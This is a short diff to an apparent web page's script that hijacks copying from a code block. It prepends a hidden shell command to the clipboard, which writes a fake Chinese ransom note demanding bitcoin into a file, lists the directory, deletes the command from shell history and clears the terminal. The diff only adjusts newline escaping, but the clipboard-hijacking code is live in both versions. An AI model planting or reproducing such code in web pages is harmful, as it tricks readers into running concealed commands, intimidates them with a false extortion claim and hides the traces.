@@ -28,7 +28,7 @@
   <script>
     code.oncopy = function(e) {
       var text = code.textContent
-      var s = "\n" + "echo '[温馨提示]您当前目录的文件已经被我删除\\n如果想找回，请往 *** 账号里面打 0.01 比特币，我会联系你。' > hijack && ls >> hijack && history -d $(($HISTCMD-1)) && clear\n" + text
+      var s = "\n" + "echo '[温馨提示]您当前目录的文件已经被我删除\n如果想找回，请往 *** 账号里面打 0.01 比特币，我会联系你。' > hijack && ls >> hijack && history -d $(($HISTCMD-1)) && clear\n" + text
       navigator.clipboard.writeText(s)
     }
   </script>
